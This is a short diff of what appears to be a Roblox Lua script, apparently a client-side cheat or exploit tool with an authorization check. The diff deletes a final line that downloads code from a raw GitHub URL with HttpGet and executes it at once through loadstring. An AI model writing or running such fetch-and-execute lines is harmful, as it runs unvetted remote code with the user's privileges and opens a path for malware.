@@ -1199,4 +1199,3 @@ if IsAutorizado(LocalPlayer.Name) then
     CreateMovableButton()
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/pao.de.queijo/refs/heads/main/ny4theru2ne"))()
